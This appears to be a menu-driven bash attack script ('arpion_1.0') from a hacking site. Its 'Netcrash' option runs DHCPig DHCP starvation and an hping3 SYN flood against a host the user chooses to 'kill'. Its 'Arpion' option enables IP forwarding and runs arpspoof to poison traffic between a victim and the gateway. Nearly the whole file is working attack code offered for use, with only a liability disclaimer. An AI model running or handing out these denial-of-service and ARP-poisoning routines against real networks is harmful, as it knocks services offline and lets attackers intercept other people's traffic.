!/bin/bash
#####################################################################################################################
#                                                                                                                   #
#                     This script is written by Johan aka Saint, admin of Webbh4tt                                  #
#  This program is open source; you can redistribute it and/or modify it under the terms of the GNU General Public  #
#                 The author bears no responsibility  for malicious or illegal use.                                 #
#                                                                                                                   #
#                                                                                                                   #
#####################################################################################################################

##########################################################################################
#                                    known bugs                                          #
#                                    None so far                                         #
#                    Please report bugs to info@webbhatt.com                             #
##########################################################################################

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
    NORMAL=`echo "\033[m"`
    BLUE=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"` #Red
    ENTER_LINE=`echo "\033[33m"`
    INTRO_TEXT=`echo "\033[32m"` #green and white text
    INFOS=`echo "\033[103;30m"` #yellow bg
    SUCCESS=`echo "\033[102;30m"` #green bg
    WARNING=`echo "\033[101;30m"` #red bg
    WARP=`echo "\033[106;30m"` #lightblue bg
    BLACK=`echo "\033[109;30m"` #SPACE bg
    END=`echo "\033[0m"`
# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
#info 
ver=$(echo arpion_1.0)
#Author Johan "Saint" Börjesson

#################################Start script and validation#################################### 

echo -e "${RED_TEXT}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${END}"
echo -e "${RED_TEXT}~~~~~~~~~~~~~~~~~~~~~~~~             MENU            ~~~~~~~~~~~~~~~~~~~~~~~~~${END}"
echo -e "${RED_TEXT}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${END}"


OPTIONS="Netcrash Arpion Portscan Quit"
           select opt in $OPTIONS; do
               if [ "$opt" = "Netcrash" ]; then
##########Startar#################
#Init
FILE="/tmp/out.$$"
GREP="/bin/grep"
#Only root should run this.
if [[ $EUID -ne 0 ]]; then
echo "Run as root." 1>&2
exit 1
fi

#Prerequisites
mkdir -p /opt/netcrash
cd /opt/netcrash
git clone https://github.com/kamorin/DHCPig.git
sudo apt-get install hping3
#Let's kill shit
echo "What host do you want to kill?"
read host
echo "What port? If unsure, use 80. Might work."
read port
echo "What interface? (default: eth0)"
read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
case $response in
    [yY][eE][sS]|[yY])
        read iface
        ;;
    *)
        iface=eth0
        ;;
esac
python DHCPig/pig.py $iface
hping3 -i u1 -S -p $port $host
               elif [ "$opt" = "Arpion" ]; then
##############startar#############
if [[ $EUID -ne 0 ]]; then
echo -e "${RED_TEXT}Script must be run as root!${END}"
exit 1
else
echo -e "${RED_TEXT}#######################################${END}"
echo -e "${RED_TEXT}########${END}${BLUE} ARP Poison Script${END}${RED_TEXT} ############${END}"
echo -e "${RED_TEXT}#######################################${END}"
echo -e "${BLUE}Author: Webbhatt${END}"
echo -e "${BLUE}Website:http://www.webbhatt.com${END}"
echo "What interface? (default: eth0)"
read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
case $response in
[yY][eE][sS]|[yY])
	read iface
;;
    *)
	iface=eth0
;;
esac
echo -n "Please enter target's IP: "
read victimIP
echo -n "Please enter Gateway's IP: "
read gatewayIP
echo -e "--==[Targets]==--"
echo -e "${RED_TEXT}Target:${END} $victimIP"
echo -e "${RED_TEXT}Gateway:${END} $gatewayIP"
echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
arpspoof -i $iface -t $victimIP $gatewayIP
              # elif [ "$opt" = "Portscan" ]; then
               # bash portscan.sh
		elif [ "$opt" = "Quit" ]; then
                exit
		else
		clear
		echo badoption
               fi
           done
